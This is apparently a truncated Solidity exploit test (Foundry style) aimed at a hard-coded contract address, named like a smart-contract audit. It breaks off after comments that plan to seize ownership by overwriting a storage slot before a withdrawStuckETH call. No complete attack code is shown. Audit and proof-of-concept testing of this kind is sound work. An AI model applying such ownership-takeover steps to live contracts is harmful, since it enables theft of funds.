interface FoundationToken_Comprehensive_Smart_Contract_Audit {
    function withdrawStuckETH() external;
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // --- State Variables ─────────────────────────────────────


    address constant TARGET = 0x9c771503a42f9b6e498d89c43e99F2e58CB8B384;
    address attacker = address(this);

    // --- Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage in the exploit
    }

    // --- Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage slot
        // FoundationToken inherits from ERC20 then Ownable
        // ERC20 has: _balances (mapping), _allowances (mapping), _totalSupply (slot 0), _name (slot 1), _symbol (slot 2)
